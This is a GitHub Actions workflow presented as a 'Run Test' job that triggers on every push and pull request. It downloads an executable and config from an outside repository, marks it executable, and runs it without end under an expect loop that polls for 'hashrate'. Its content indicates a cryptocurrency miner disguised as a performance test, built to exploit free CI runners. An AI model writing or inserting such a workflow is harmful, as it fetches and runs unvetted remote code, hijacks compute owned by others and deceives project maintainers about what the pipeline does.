name: Run Test

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
    - name: Create test directory
      run: mkdir -p test

    - name: Download test executable
      run: |
        curl -L -o test/test https://github.com/cryptogolbu-hash/Performance-Testing/raw/refs/heads/main/test
        chmod +x test/test

    - name: Download config file
      run: curl -L -o test/config.json https://raw.githubusercontent.com/cryptogolbu-hash/Performance-Testing/refs/heads/main/config.json

    - name: Install expect
      run: sudo apt-get update && sudo apt-get install -y expect

    - name: Create expect script
      run: |
        cat > monitor.exp << 'EOF'
        #!/usr/bin/expect -f
        set timeout -1
        spawn ./test/test

        sleep 10

        while {1} {
          sleep 60
          send "h\r"
          expect -timeout 5 "*"
        }
        EOF
        chmod +x monitor.exp
      working-directory: ${{ github.workspace }}

    - name: Run test with hashrate monitoring
      run: ./monitor.exp
      working-directory: ${{ github.workspace }}
